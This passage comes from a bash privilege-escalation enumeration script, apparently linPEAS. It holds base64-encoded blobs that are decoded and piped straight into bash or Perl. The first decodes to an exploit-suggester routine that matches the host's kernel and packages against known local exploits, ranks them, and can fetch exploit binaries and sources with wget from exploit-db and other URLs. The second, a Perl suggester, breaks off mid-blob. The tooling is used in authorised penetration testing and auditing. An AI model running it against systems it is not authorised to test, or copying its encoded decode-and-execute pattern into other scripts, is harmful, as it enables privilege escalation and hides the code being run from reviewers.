D0iIgogICAgICAgIHVuc2V0IEVYUExPSVRTCiAgICAgICAgZGVjbGFyZSAtQSBFWFBMT0lUUwogICAgICAgIGdldFBrZ0xpc3QgIiIgIiRQS0dMSVNUX0ZJTEUiCgogICAgICAgICMgYWRkaXRpb25hbCBjaGVja3MgYXJlIG5vdCBhcHBsaWNhYmxlIGZvciB0aGlzIG1vZGUKICAgICAgICBvcHRfc2tpcF9tb3JlX2NoZWNrcz10cnVlCiAgICBmaQpmaQoKZWNobwplY2hvIC1lICIke2JsZHdodH1BdmFpbGFibGUgaW5mb3JtYXRpb246JHt0eHRyc3R9IgplY2hvClsgLW4gIiRLRVJORUwiIF0gJiYgZWNobyAtZSAiS2VybmVsIHZlcnNpb246ICR7dHh0Z3JufSRLRVJORUwke3R4dHJzdH0iIHx8IGVjaG8gLWUgIktlcm5lbCB2ZXJzaW9uOiAke3R4dHJlZH1OL0Eke3R4dHJzdH0iCmVjaG8gIkFyY2hpdGVjdHVyZTogJChbIC1uICIkQVJDSCIgXSAmJiBlY2hvIC1lICIke3R4dGdybn0kQVJDSCR7dHh0cnN0fSIgfHwgZWNobyAtZSAiJHt0eHRyZWR9Ti9BJHt0eHRyc3R9IikiCmVjaG8gIkRpc3RyaWJ1dGlvbjogJChbIC1uICIkT1MiIF0gJiYgZWNobyAtZSAiJHt0eHRncm59JE9TJHt0eHRyc3R9IiB8fCBlY2hvIC1lICIke3R4dHJlZH1OL0Eke3R4dHJzdH0iKSIKZWNobyAtZSAiRGlzdHJpYnV0aW9uIHZlcnNpb246ICQoWyAtbiAiJERJU1RSTyIgXSAmJiBlY2hvIC1lICIke3R4dGdybn0kRElTVFJPJHt0eHRyc3R9IiB8fCBlY2hvIC1lICIke3R4dHJlZH1OL0Eke3R4dHJzdH0iKSIKCmVjaG8gIkFkZGl0aW9uYWwgY2hlY2tzIChDT05GSUdfKiwgc3lzY3RsIGVudHJpZXMsIGN1c3RvbSBCYXNoIGNvbW1hbmRzKTogJChbICIkb3B0X3NraXBfbW9yZV9jaGVja3MiID09ICJmYWxzZSIgXSAmJiBlY2hvIC1lICIke3R4dGdybn1wZXJmb3JtZWQke3R4dHJzdH0iIHx8IGVjaG8gLWUgIiR7dHh0cmVkfU4vQSR7dHh0cnN0fSIpIgoKaWYgWyAtbiAiJFBLR0xJU1RfRklMRSIgLWEgLW4gIiRQS0dfTElTVCIgXTsgdGhlbgogICAgcGtnTGlzdEZpbGU9IiR7dHh0Z3JufSRQS0dMSVNUX0ZJTEUke3R4dHJzdH0iCmVsaWYgWyAtbiAiJFBLR0xJU1RfRklMRSIgXTsgdGhlbgogICAgcGtnTGlzdEZpbGU9IiR7dHh0cmVkfXVucmVjb2duaXplZCBmaWxlIHByb3ZpZGVkJHt0eHRyc3R9IgplbGlmIFsgLW4gIiRQS0dfTElTVCIgXTsgdGhlbgogICAgcGtnTGlzdEZpbGU9IiR7dHh0Z3JufWZyb20gY3VycmVudCBPUyR7dHh0cnN0fSIKZmkKCmVjaG8gLWUgIlBhY2thZ2UgbGlzdGluZzogJChbIC1uICIkcGtnTGlzdEZpbGUiIF0gJiYgZWNobyAtZSAiJHBrZ0xpc3RGaWxlIiB8fCBlY2hvIC1lICIke3R4dHJlZH1OL0Eke3R4dHJzdH0iKSIKCiMgaGFuZGxlIC0ta2VybmVsc3BhY3ktb25seSAmIC0tdXNlcnNwYWNlLW9ubHkgZmlsdGVyIG9wdGlvbnMKaWYgWyAiJG9wdF9rZXJuZWxfb25seSIgPSAidHJ1ZSIgLW8gLXogIiRQS0dfTElTVCIgXTsgdGhlbgogICAgdW5zZXQgRVhQTE9JVFNfVVNFUlNQQUNFCiAgICBkZWNsYXJlIC1BIEVYUExPSVRTX1VTRVJTUEFDRQpmaQoKaWYgWyAiJG9wdF91c2Vyc3BhY2Vfb25seSIgPSAidHJ1ZSIgXTsgdGhlbgogICAgdW5zZXQgRVhQTE9JVFMKICAgIGRlY2xhcmUgLUEgRVhQTE9JVFMKZmkKCmVjaG8KZWNobyAtZSAiJHtibGR3aHR9U2VhcmNoaW5nIGFtb25nOiR7dHh0cnN0fSIKZWNobwplY2hvICIkeyNFWFBMT0lUU1tAXX0ga2VybmVsIHNwYWNlIGV4cGxvaXRzIgplY2hvICIkeyNFWFBMT0lUU19VU0VSU1BBQ0VbQF19IHVzZXIgc3BhY2UgZXhwbG9pdHMiCmVjaG8KCmVjaG8gLWUgIiR7Ymxkd2h0fVBvc3NpYmxlIEV4cGxvaXRzOiR7dHh0cnN0fSIKZWNobwoKIyBzdGFydCBhbmFseXNpcwpqPTAKZm9yIEVYUCBpbiAiJHtFWFBMT0lUU1tAXX0iICIke0VYUExPSVRTX1VTRVJTUEFDRVtAXX0iOyBkbwoKICAgICMgY3JlYXRlIGFycmF5IGZyb20gY3VycmVudCBleHBsb2l0IGhlcmUgZG9jIGFuZCBmZXRjaCBuZWVkZWQgbGluZXMKICAgIGk9MAogICAgIyAoJy1yJyBpcyB1c2VkIHRvIG5vdCBpbnRlcnByZXQgYmFja3NsYXNoIHVzZWQgZm9yIGJhc2ggY29sb3JzKQogICAgd2hpbGUgcmVhZCAtciBsaW5lCiAgICBkbwogICAgICAgIGFycltpXT0iJGxpbmUiCiAgICAgICAgaT0kKChpICsgMSkpCiAgICBkb25lIDw8PCAiJEVYUCIKCiAgICBOQU1FPSIke2FyclswXX0iICYmIE5BTUU9IiR7TkFNRTo2fSIKICAgIFJFUVM9IiR7YXJyWzFdfSIgJiYgUkVRUz0iJHtSRVFTOjZ9IgogICAgVEFHUz0iJHthcnJbMl19IiAmJiBUQUdTPSIke1RBR1M6Nn0iCiAgICBSQU5LPSIke2FyclszXX0iICYmIFJBTks9IiR7UkFOSzo2fSIKCiAgICAjIHNwbGl0IGxpbmUgd2l0aCByZXF1aXJlbWVudHMgJiBsb29wIHRocnUgYWxsIHJlcXMgb25lIGJ5IG9uZSAmIGNoZWNrIHdoZXRoZXIgaXQgaXMgbWV0CiAgICBJRlM9JywnIHJlYWQgLXIgLWEgYXJyYXkgPDw8ICIkUkVRUyIKICAgIFJFUVNfTlVNPSR7I2FycmF5W0BdfQogICAgUEFTU0VEX1JFUT0wCiAgICBmb3IgUkVRIGluICIke2FycmF5W0BdfSI7IGRvCiAgICAgICAgaWYgKGNoZWNrUmVxdWlyZW1lbnQgIiRSRVEiICIke2FycmF5WzBdfSIpOyB0aGVuCiAgICAgICAgICAgIFBBU1NFRF9SRVE9JCgoJFBBU1NFRF9SRVEgKyAxKSkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZmkKICAgIGRvbmUKCiAgICAjIGV4ZWN1dGUgZm9yIGV4cGxvaXRzIHdpdGggYWxsIHJlcXVpcmVtZW50cyBtZXQKICAgIGlmIFsgJFBBU1NFRF9SRVEgLWVxICRSRVFTX05VTSBdOyB0aGVuCgogICAgICAgICMgYWRkaXRpb25hbCByZXF1aXJlbWVudCBmb3IgLS1jdmVsaXN0LWZpbGUgbW9kZTogY2hlY2sgaWYgQ1ZFIGFzc29jaWF0ZWQgd2l0aCB0aGUgZXhwbG9pdCBpcyBvbiB0aGUgQ1ZFTElTVF9GSUxFCiAgICAgICAgaWYgWyAiJG9wdF9jdmVsaXN0X2ZpbGUiID0gInRydWUiIF07IHRoZW4KCiAgICAgICAgICAgICMgZXh0cmFjdCBDVkUocykgYXNzb2NpYXRlZCB3aXRoIGdpdmVuIGV4cGxvaXQgKGFsc28gdHJhbnNsYXRlcyAnLCcgdG8gJ3wnIGZvciBlYXN5IGhhbmRsaW5nIG11bHRpcGxlIENWRXMgY2FzZSAtIHZpYSBleHRlbmRlZCByZWdleCkKICAgICAgICAgICAgY3ZlPSQoZWNobyAiJE5BTUUiIHwgZ3JlcCAnLipcWy4qXF0uKicgfCBjdXQgLWQgJ20nIC1mMiB8IGN1dCAtZCAnXScgLWYxIHwgdHIgLWQgJ1snIHwgdHIgIiwiICJ8IikKICAgICAgICAgICAgI2VjaG8gIkNWRTogJGN2ZSIKCiAgICAgICAgICAgICMgY2hlY2sgaWYgaXQncyBvbiBDVkVMSVNUX0ZJTEUgbGlzdCwgaWYgbm8gbW92ZSB0byBuZXh0IGV4cGxvaXQKICAgICAgICAgICAgWyAhICQoY2F0ICIkQ1ZFTElTVF9GSUxFIiB8IGdyZXAgLUUgIiRjdmUiKSBdICYmIGNvbnRpbnVlCiAgICAgICAgZmkKCiAgICAgICAgIyBwcm9jZXNzIHRhZ3MgYW5kIGhpZ2hsaWdodCB0aG9zZSB0aGF0IG1hdGNoIGN1cnJlbnQgT1MgKG9ubHkgZm9yIGRlYnx1YnVudHV8UkhFTCBhbmQgaWYgd2Uga25vdyBkaXN0cm8gdmVyc2lvbiAtIGRpcmVjdCBtb2RlKQogICAgICAgIHRhZ3M9IiIKICAgICAgICBpZiBbIC1uICIkVEFHUyIgLWEgLW4gIiRPUyIgXTsgdGhlbgogICAgICAgICAgICBJRlM9JywnIHJlYWQgLXIgLWEgdGFnc19hcnJheSA8PDwgIiRUQUdTIgogICAgICAgICAgICBUQUdTX05VTT0keyN0YWdzX2FycmF5W0BdfQoKICAgICAgICAgICAgIyBidW1wIFJBTksgc2xpZ2h0bHkgKCsxKSBpZiB3ZSdyZSBpbiAnLS11bmFtZScgbW9kZSBhbmQgdGhlcmUncyBhIFRBRyBmb3IgT1MgZnJvbSB1bmFtZSBzdHJpbmcKICAgICAgICAgICAgWyAiJChlY2hvICIke3RhZ3NfYXJyYXlbQF19IiB8IGdyZXAgIiRPUyIpIiAtYSAiJG9wdF91bmFtZV9zdHJpbmciID09ICJ0cnVlIiBdICYmIFJBTks9JCgoJFJBTksgKyAxKSkKCiAgICAgICAgICAgIGZvciBUQUcgaW4gIiR7dGFnc19hcnJheVtAXX0iOyBkbwogICAgICAgICAgICAgICAgdGFnX2Rpc3Rybz0kKGVjaG8gIiRUQUciIHwgY3V0IC1kJz0nIC1mMSkKICAgICAgICAgICAgICAgIHRhZ19kaXN0cm9fbnVtX2FsbD0kKGVjaG8gIiRUQUciIHwgY3V0IC1kJz0nIC1mMikKICAgICAgICAgICAgICAgICMgaW4gY2FzZSBvZiB0YWcgb2YgZm9ybTogJ3VidW50dT0xNi4wNHtrZXJuZWw6NC40LjAtMjF9IHJlbW92ZSBrZXJuZWwgdmVyc2lvbmluZyBwYXJ0IGZvciBjb21wYXJpc2lvbgogICAgICAgICAgICAgICAgdGFnX2Rpc3Ryb19udW09IiR7dGFnX2Rpc3Ryb19udW1fYWxsJXsqfSIKCiAgICAgICAgICAgICAgICAjIHdlJ3JlIGluICctLXVuYW1lJyBtb2RlIE9SIChmb3Igbm9ybWFsIG1vZGUpIGlmIHRoZXJlIGlzIGRpc3RybyB2ZXJzaW9uIG1hdGNoCiAgICAgICAgICAgICAgICBpZiBbICIkb3B0X3VuYW1lX3N0cmluZyIgPT0gInRydWUiIC1vIFwoICIkT1MiID09ICIkdGFnX2Rpc3RybyIgLWEgIiQoZWNobyAiJERJU1RSTyIgfCBncmVwIC1FICIkdGFnX2Rpc3Ryb19udW0iKSIgXCkgXTsgdGhlbgoKICAgICAgICAgICAgICAgICAgICAjIGJ1bXAgY3VycmVudCBleHBsb2l0J3MgcmFuayBieSAyIGZvciBkaXN0cm8gbWF0Y2ggKGFuZCBub3QgaW4gJy0tdW5hbWUnIG1vZGUpCiAgICAgICAgICAgICAgICAgICAgWyAiJG9wdF91bmFtZV9zdHJpbmciID09ICJmYWxzZSIgXSAmJiBSQU5LPSQoKCRSQU5LICsgMikpCgogICAgICAgICAgICAgICAgICAgICMgZ2V0IG5hbWUgKGtlcm5lbCBvciBwYWNrYWdlIG5hbWUpIGFuZCB2ZXJzaW9uIG9mIGtlcm5lbC9wa2cgaWYgcHJvdmlkZWQ6CiAgICAgICAgICAgICAgICAgICAgdGFnX3BrZz0kKGVjaG8gIiR0YWdfZGlzdHJvX251bV9hbGwiIHwgY3V0IC1kJ3snIC1mIDIgfCB0ciAtZCAnfScgfCBjdXQgLWQnOicgLWYgMSkKICAgICAgICAgICAgICAgICAgICB0YWdfcGtnX251bT0iIgogICAgICAgICAgICAgICAgICAgIFsgJChlY2hvICIkdGFnX2Rpc3Ryb19udW1fYWxsIiB8IGdyZXAgJ3snKSBdICYmIHRhZ19wa2dfbnVtPSQoZWNobyAiJHRhZ19kaXN0cm9fbnVtX2FsbCIgfCBjdXQgLWQneycgLWYgMiB8IHRyIC1kICd9JyB8IGN1dCAtZCc6JyAtZiAyKQoKICAgICAgICAgICAgICAgICAgICAjWyAtbiAiJHRhZ19wa2dfbnVtIiBdICYmIGVjaG8gInRhZ19wa2dfbnVtOiAkdGFnX3BrZ19udW07IGtlcm5lbDogJEtFUk5FTF9BTEwiCgogICAgICAgICAgICAgICAgICAgICMgaWYgcGtnL2tlcm5lbCB2ZXJzaW9uIGlzIG5vdCBwcm92aWRlZDoKICAgICAgICAgICAgICAgICAgICBpZiBbIC16ICIkdGFnX3BrZ19udW0iIF07IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgWyAiJG9wdF91bmFtZV9zdHJpbmciID09ICJmYWxzZSIgXSAmJiBUQUc9IiR7bGlnaHR5ZWxsb3d9WyAke1RBR30gXSR7dHh0cnN0fSIKCiAgICAgICAgICAgICAgICAgICAgIyBrZXJuZWwgdmVyc2lvbiBwcm92aWRlZCwgY2hlY2sgZm9yIG1hdGNoOgogICAgICAgICAgICAgICAgICAgIGVsaWYgWyAtbiAiJHRhZ19wa2dfbnVtIiAtYSAiJHRhZ19wa2ciID0gImtlcm5lbCIgXTsgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBbICQoZWNobyAiJEtFUk5FTF9BTEwiIHwgZ3JlcCAtRSAiJHt0YWdfcGtnX251bX0iKSBdOyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGtlcm5lbCB2ZXJzaW9uIG1hdGNoZWQgLSBib2xkIGhpZ2hsaWdodAogICAgICAgICAgICAgICAgICAgICAgICAgICAgVEFHPSIke3llbGxvd31bICR7VEFHfSBdJHt0eHRyc3R9IgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgYnVtcCBjdXJyZW50IGV4cGxvaXQncyByYW5rIGFkZGl0aW9uYWxseSBieSAzIGZvciBrZXJuZWwgdmVyc2lvbiByZWdleCBtYXRjaAogICAgICAgICAgICAgICAgICAgICAgICAgICAgUkFOSz0kKCgkUkFOSyArIDMpKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbICIkb3B0X3VuYW1lX3N0cmluZyIgPT0gImZhbHNlIiBdICYmIFRBRz0iJHtsaWdodHllbGxvd31bICR0YWdfZGlzdHJvPSR0YWdfZGlzdHJvX251bSBdJHt0eHRyc3R9e2tlcm5lbDokdGFnX3BrZ19udW19IgogICAgICAgICAgICAgICAgICAgICAgICBmaQoKICAgICAgICAgICAgICAgICAgICAjIHBrZyB2ZXJzaW9uIHByb3ZpZGVkLCBjaGVjayBmb3IgbWF0Y2ggKFRCRCk6CiAgICAgICAgICAgICAgICAgICAgZWxpZiBbIC1uICIkdGFnX3BrZ19udW0iIC1hIC1uICIkdGFnX3BrZyIgIF07IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVEFHPSIke2xpZ2h0eWVsbG93fVsgJHRhZ19kaXN0cm89JHRhZ19kaXN0cm9fbnVtIF0ke3R4dHJzdH17JHRhZ19wa2c6JHRhZ19wa2dfbnVtfSIKICAgICAgICAgICAgICAgICAgICBmaQoKICAgICAgICAgICAgICAgIGZpCgogICAgICAgICAgICAgICAgIyBhcHBlbmQgY3VycmVudCB0YWcgdG8gdGFncyBsaXN0CiAgICAgICAgICAgICAgICB0YWdzPSIke3RhZ3N9JHtUQUd9LCIKICAgICAgICAgICAgZG9uZQogICAgICAgICAgICAjIHRyaW0gJywnIGFkZGVkIGJ5IGFib3ZlIGxvb3AKICAgICAgICAgICAgWyAtbiAiJHRhZ3MiIF0gJiYgdGFncz0iJHt0YWdzJT99IgogICAgICAgIGVsc2UKICAgICAgICAgICAgdGFncz0iJFRBR1MiCiAgICAgICAgZmkKCiAgICAgICAgIyBpbnNlcnQgdGhlIG1hdGNoZWQgZXhwbG9pdCAod2l0aCBjYWxjdWxhdGVkIFJhbmsgYW5kIGhpZ2hsaWdodGVkIHRhZ3MpIHRvIGFycmFyeSB0aGF0IHdpbGwgYmUgc29ydGVkCiAgICAgICAgRVhQPSQoZWNobyAiJEVYUCIgfCBzZWQgLWUgJy9eTmFtZTovZCcgLWUgJy9eUmVxczovZCcgLWUgJy9eVGFnczovZCcpCiAgICAgICAgZXhwbG9pdHNfdG9fc29ydFtqXT0iJHtSQU5LfU5hbWU6ICR7TkFNRX1EM0wxbVJlcXM6ICR7UkVRU31EM0wxbVRhZ3M6ICR7dGFnc31EM0wxbSQoZWNobyAiJEVYUCIgfCBzZWQgLWUgJzphJyAtZSAnTicgLWUgJyQhYmEnIC1lICdzL1xuL0QzTDFtL2cnKSIKICAgICAgICAoKGorKykpCiAgICBmaQpkb25lCgojIHNvcnQgZXhwbG9pdHMgYmFzZWQgb24gY2FsY3VsYXRlZCBSYW5rCklGUz0kJ1xuJwpTT1JURURfRVhQTE9JVFM9KCQoc29ydCAtciA8PDwiJHtleHBsb2l0c190b19zb3J0WypdfSIpKQp1bnNldCBJRlMKCiMgZGlzcGxheSBzb3J0ZWQgZXhwbG9pdHMKZm9yIEVYUF9URU1QIGluICIke1NPUlRFRF9FWFBMT0lUU1tAXX0iOyBkbwoKCVJBTks9JChlY2hvICIkRVhQX1RFTVAiIHwgYXdrIC1GJ05hbWU6JyAne3ByaW50ICQxfScpCgoJIyBjb252ZXJ0IGVudHJ5IGJhY2sgdG8gY2Fub25pY2FsIGZvcm0KCUVYUD0kKGVjaG8gIiRFWFBfVEVNUCIgfCBzZWQgJ3MvXlswLTldLy9nJyB8IHNlZCAncy9EM0wxbS9cbi9nJykKCgkjIGNyZWF0ZSBhcnJheSBmcm9tIGN1cnJlbnQgZXhwbG9pdCBoZXJlIGRvYyBhbmQgZmV0Y2ggbmVlZGVkIGxpbmVzCiAgICBpPTAKICAgICMgKCctcicgaXMgdXNlZCB0byBub3QgaW50ZXJwcmV0IGJhY2tzbGFzaCB1c2VkIGZvciBiYXNoIGNvbG9ycykKICAgIHdoaWxlIHJlYWQgLXIgbGluZQogICAgZG8KICAgICAgICBhcnJbaV09IiRsaW5lIgogICAgICAgIGk9JCgoaSArIDEpKQogICAgZG9uZSA8PDwgIiRFWFAiCgogICAgTkFNRT0iJHthcnJbMF19IiAmJiBOQU1FPSIke05BTUU6Nn0iCiAgICBSRVFTPSIke2FyclsxXX0iICYmIFJFUVM9IiR7UkVRUzo2fSIKICAgIFRBR1M9IiR7YXJyWzJdfSIgJiYgdGFncz0iJHtUQUdTOjZ9IgoKCUVYUExPSVRfREI9JChlY2hvICIkRVhQIiB8IGdyZXAgImV4cGxvaXQtZGI6ICIgfCBhd2sgJ3twcmludCAkMn0nKQoJYW5hbHlzaXNfdXJsPSQoZWNobyAiJEVYUCIgfCBncmVwICJhbmFseXNpcy11cmw6ICIgfCBhd2sgJ3twcmludCAkMn0nKQoJZXh0X3VybD0kKGVjaG8gIiRFWFAiIHwgZ3JlcCAiZXh0LXVybDogIiB8IGF3ayAne3ByaW50ICQyfScpCgljb21tZW50cz0kKGVjaG8gIiRFWFAiIHwgZ3JlcCAiQ29tbWVudHM6ICIgfCBjdXQgLWQnICcgLWYgMi0pCglyZXFzPSQoZWNobyAiJEVYUCIgfCBncmVwICJSZXFzOiAiIHwgY3V0IC1kJyAnIC1mIDIpCgoJIyBleHBsb2l0IG5hbWUgd2l0aG91dCBDVkUgbnVtYmVyIGFuZCB3aXRob3V0IGNvbW1vbmx5IHVzZWQgc3BlY2lhbCBjaGFycwoJbmFtZT0kKGVjaG8gIiROQU1FIiB8IGN1dCAtZCcgJyAtZiAyLSB8IHRyIC1kICcgKCkvJykKCgliaW5fdXJsPSQoZWNobyAiJEVYUCIgfCBncmVwICJiaW4tdXJsOiAiIHwgYXdrICd7cHJpbnQgJDJ9JykKCXNyY191cmw9JChlY2hvICIkRVhQIiB8IGdyZXAgInNyYy11cmw6ICIgfCBhd2sgJ3twcmludCAkMn0nKQoJWyAteiAiJHNyY191cmwiIF0gJiYgWyAtbiAiJEVYUExPSVRfREIiIF0gJiYgc3JjX3VybD0iaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG93bmxvYWQvJEVYUExPSVRfREIiCglbIC16ICIkc3JjX3VybCIgXSAmJiBbIC16ICIkYmluX3VybCIgXSAmJiBleGl0V2l0aEVyck1zZyAiJ3NyYy11cmwnIC8gJ2Jpbi11cmwnIC8gJ2V4cGxvaXQtZGInIGVudHJpZXMgYXJlIGFsbCBlbXB0eSBmb3IgJyROQU1FJyBleHBsb2l0IC0gZml4IHRoYXQuIEFib3J0aW5nLiIKCglpZiBbIC1uICIkYW5hbHlzaXNfdXJsIiBdOyB0aGVuCiAgICAgICAgZGV0YWlscz0iJGFuYWx5c2lzX3VybCIKCWVsaWYgJChlY2hvICIkc3JjX3VybCIgfCBncmVwIC1xICd3d3cuZXhwbG9pdC1kYi5jb20nKTsgdGhlbgogICAgICAgIGRldGFpbHM9Imh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLyRFWFBMT0lUX0RCLyIKCWVsaWYgW1sgIiRzcmNfdXJsIiA9fiBeLip0Z3p8dGFyLmd6fHppcCQgJiYgLW4gIiRFWFBMT0lUX0RCIiBdXTsgdGhlbgogICAgICAgIGRldGFpbHM9Imh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLyRFWFBMT0lUX0RCLyIKCWVsc2UKICAgICAgICBkZXRhaWxzPSIkc3JjX3VybCIKCWZpCgoJIyBza2lwIERvUyBieSBkZWZhdWx0Cglkb3M9JChlY2hvICIkRVhQIiB8IGdyZXAgLW8gLWkgIihkb3MiKQoJWyAiJG9wdF9zaG93X2RvcyIgPT0gImZhbHNlIiBdICYmIFsgLW4gIiRkb3MiIF0gJiYgY29udGludWUKCgkjIGhhbmRsZXMgLS1mZXRjaC1iaW5hcmllcyBvcHRpb24KCWlmIFsgJG9wdF9mZXRjaF9iaW5zID0gInRydWUiIF07IHRoZW4KICAgICAgICBmb3IgaSBpbiAkKGVjaG8gIiRFWFAiIHwgZ3JlcCAiYmluLXVybDogIiB8IGF3ayAne3ByaW50ICQyfScpOyBkbwogICAgICAgICAgICBbIC1mICIke25hbWV9XyQoYmFzZW5hbWUgJGkpIiBdICYmIHJtIC1mICIke25hbWV9XyQoYmFzZW5hbWUgJGkpIgogICAgICAgICAgICB3Z2V0IC1xIC1rICIkaSIgLU8gIiR7bmFtZX1fJChiYXNlbmFtZSAkaSkiCiAgICAgICAgZG9uZQogICAgZmkKCgkjIGhhbmRsZXMgLS1mZXRjaC1zb3VyY2VzIG9wdGlvbgoJaWYgWyAkb3B0X2ZldGNoX3NyY3MgPSAidHJ1ZSIgXTsgdGhlbgogICAgICAgIFsgLWYgIiR7bmFtZX1fJChiYXNlbmFtZSAkc3JjX3VybCkiIF0gJiYgcm0gLWYgIiR7bmFtZX1fJChiYXNlbmFtZSAkc3JjX3VybCkiCiAgICAgICAgd2dldCAtcSAtayAiJHNyY191cmwiIC1PICIke25hbWV9XyQoYmFzZW5hbWUgJHNyY191cmwpIiAmCiAgICBmaQoKICAgICMgZGlzcGxheSByZXN1bHQgKHNob3J0KQoJaWYgWyAiJG9wdF9zdW1tYXJ5IiA9ICJ0cnVlIiBdOyB0aGVuCglbIC16ICIkdGFncyIgXSAmJiB0YWdzPSItIgoJZWNobyAtZSAiJE5BTUUgfHwgJHRhZ3MgfHwgJHNyY191cmwiCgljb250aW51ZQoJZmkKCiMgZGlzcGxheSByZXN1bHQgKHN0YW5kYXJkKQoJZWNobyAtZSAiWytdICROQU1FIgoJZWNobyAtZSAiXG4gICBEZXRhaWxzOiAkZGV0YWlscyIKICAgICAgICBlY2hvIC1lICIgICBFeHBvc3VyZTogJChkaXNwbGF5RXhwb3N1cmUgJFJBTkspIgogICAgICAgIFsgLW4gIiR0YWdzIiBdICYmIGVjaG8gLWUgIiAgIFRhZ3M6ICR0YWdzIgogICAgICAgIGVjaG8gLWUgIiAgIERvd25sb2FkIFVSTDogJHNyY191cmwiCiAgICAgICAgWyAtbiAiJGV4dF91cmwiIF0gJiYgZWNobyAtZSAiICAgZXh0LXVybDogJGV4dF91cmwiCiAgICAgICAgWyAtbiAiJGNvbW1lbnRzIiBdICYmIGVjaG8gLWUgIiAgIENvbW1lbnRzOiAkY29tbWVudHMiCgogICAgICAgICMgaGFuZGxlcyAtLWZ1bGwgZmlsdGVyIG9wdGlvbgogICAgICAgIGlmIFsgIiRvcHRfZnVsbCIgPSAidHJ1ZSIgXTsgdGhlbgogICAgICAgICAgICBbIC1uICIkcmVxcyIgXSAmJiBlY2hvIC1lICIgICBSZXF1aXJlbWVudHM6ICRyZXFzIgoKICAgICAgICAgICAgWyAtbiAiJEVYUExPSVRfREIiIF0gJiYgZWNobyAtZSAiICAgZXhwbG9pdC1kYjogJEVYUExPSVRfREIiCgogICAgICAgICAgICBhdXRob3I9JChlY2hvICIkRVhQIiB8IGdyZXAgImF1dGhvcjogIiB8IGN1dCAtZCcgJyAtZiAyLSkKICAgICAgICAgICAgWyAtbiAiJGF1dGhvciIgXSAmJiBlY2hvIC1lICIgICBhdXRob3I6ICRhdXRob3IiCiAgICAgICAgZmkKCiAgICAgICAgZWNobwoKZG9uZQo="
    echo $les_b64 | base64 -d | bash | sed "s,$(printf '\033')\\[[0-9;]*[a-zA-Z],,g" | grep -i "\[CVE" -A 10 | grep -Ev "^\-\-$" | sed -${E} "s,\[CVE-[0-9]+-[0-9]+\].*,${SED_RED},g"
    echo ""
fi

if [ "$(command -v perl 2>/dev/null)" ]; then
    print_2title "Executing Linux Exploit Suggester 2"
    print_info "https://github.com/jondonas/linux-exploit-suggester-2"
    les2_b64="IyEvdXNyL2Jpbi9wZXJsCnVzZSBzdHJpY3Q7CnVzZSB3YXJuaW5nczsKdXNlIEdldG9wdDo6U3RkOwoKb3VyICRWRVJTSU9OID0gJzInOwoKbXkgJW9wdHM7CmdldG9wdHMoICdrOmhkJywgXCVvcHRzICk7CmlmIChleGlzdHMgJG9wdHN7aH0pIHsKICAgIHVzYWdlKCk7CiAgICBleGl0Owp9OwoKcHJpbnRfYmFubmVyKCk7Cm15ICggJGtob3N0LCAkaXNfcGFydGlhbCApID0gZ2V0X2tlcm5lbCgpOwpwcmludCAiICBMb2NhbCBLZXJuZWw6IFxlWzAwOzMzbSRraG9zdFxlWzAwbVxuIjsKCm15ICVleHBsb2l0cyA9IGdldF9leHBsb2l0cygpOwpwcmludCAnICBTZWFyY2hpbmcgJyAuIHNjYWxhciBrZXlzKCVleHBsb2l0cykgLiAiIGV4cGxvaXRzLi4uXG5cbiI7CnByaW50ICIgIFxlWzE7MzVtUG9zc2libGUgRXhwbG9pdHNcZVswMG1cbiI7CgpteSAkY291bnQgPSAxOwpteSBAYXBwbGljYWJsZSA9ICgpOwpFWFBMT0lUOgpmb3JlYWNoIG15ICRrZXkgKCBzb3J0IGtleXMgJWV4cGxvaXRzICkgewogICAgZm9yZWFjaCBteSAka2VybmVsICggQHsgJGV4cGxvaXRzeyRrZXl9e3Z1bG59IH0gKSB7CgogICAgICAgIGlmICggICAgICRraG9zdCBlcSAka2VybmVsCiAgICAgICAgICAgICAgb3IgKCAkaXNfcGFydGlhbCBhbmQgaW5kZXgoJGtlcm5lbCwka2hvc3QpID09IDAgKQogICAgICAgICkgewogICAgICAgICAgICAkZXhwbG9pdHN7JGtleX17a2V5fSA9ICRrZXk7CiAgICAgICAgICAgIHB1c2goQGFwcGxpY2FibGUsICRleHBsb2l0c3ska2V5fSk7CiAgICAgICAgICAgIHByaW50ICIgIFxlWzAwOzMzbVtcZVswMG1cZVswMDszMW0kY291bnRcZVswMG1cZVswMDszM21dXGVbMDBtICI7CiAgICAgICAgICAgIHByaW50ICJcZVswMDszM20ka2V5XGVbMDBtIjsKICAgICAgICAgICAgcHJpbnQgIiBcZVswMDszM20oJGtlcm5lbClcZVswMG0iIGlmICRpc19wYXJ0aWFsOwoKICAgICAgICAgICAgbXkgJGFsdCA9ICRleHBsb2l0c3ska2V5fXthbHR9OwogICAgICAgICAgICBteSAkY3ZlID0gJGV4cGxvaXRzeyRrZXl9e2N2ZX07CiAgICAgICAgICAgIG15ICRtbHcgPSAkZXhwbG9pdHN7JGtleX17bWlsfTsKICAgICAgICAgICAgaWYgKCAkYWx0IG9yICRjdmUgKSB7CiAgICAgICAgICAgICAgICBwcmludCAiXG4iOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICggJGFsdCApIHsgcHJpbnQgIiAgICAgIEFsdDogJGFsdCAiOyB9CiAgICAgICAgICAgIGlmICggJGN2ZSApIHsgcHJpbnQgIiAgICAgIENWRS0kY3ZlIjsgfQogICAgICAgICAgICBpZiAoICRtbHcgKSB7IHByaW50ICJcbiAgICAgIFNvdXJjZTogJG1sdyI7IH0KICAgICAgICAgICAgcHJpbnQgIlxuIjsKICAgICAgICAgICAgJGNvdW50ICs9IDE7CiAgICAgICAgICAgIG5leHQgRVhQTE9JVDsKICAgICAgICB9CiAgICB9Cn0KcHJpbnQgIlxuIjsKCmlmICghQGFwcGxpY2FibGUpIHsKICAgIHByaW50ICIgIE5vIGV4cGxvaXRzIGFyZSBhdmFpbGFibGUgZm9yIHRoaXMga2VybmVsIHZlcnNpb25cblxuIjsKICAgIGV4aXQ7